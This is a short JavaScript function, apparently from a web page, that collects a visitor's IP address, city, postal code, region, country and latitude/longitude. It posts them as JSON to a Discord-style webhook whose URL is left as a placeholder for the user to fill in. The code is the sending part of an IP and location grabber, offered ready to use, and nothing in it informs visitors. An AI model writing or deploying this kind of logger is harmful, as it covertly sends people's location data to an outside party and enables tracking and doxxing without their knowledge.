function sendMessage(){

    var date = new Date();
    var n = date.toDateString();
    var time = date.toLocaleTimeString();

    let webhookUsername = String(n) + " at " + String(time);

    var request = new XMLHttpRequest();
    request.open("POST", "url");
    //obviously enter the actual webhook url above

    request.setRequestHeader('Content-type', 'application/json');

    var params = {
        username: webhookUsername,
        avatar_url: "",
        content: "IP: " + JSON.stringify(information.ip) + "\nCity: " + JSON.stringify(information.city) + "\nPostal Code: " + JSON.stringify(information.postal_code) + "\nState: " + JSON.stringify(information.region) + "\nCountry: " + JSON.stringify(information.country_name) + "\nLongitude: " + JSON.stringify(information.longitude) + "\nLatitude: " + JSON.stringify(information.latitude)
    }

    request.send(JSON.stringify(params));
}
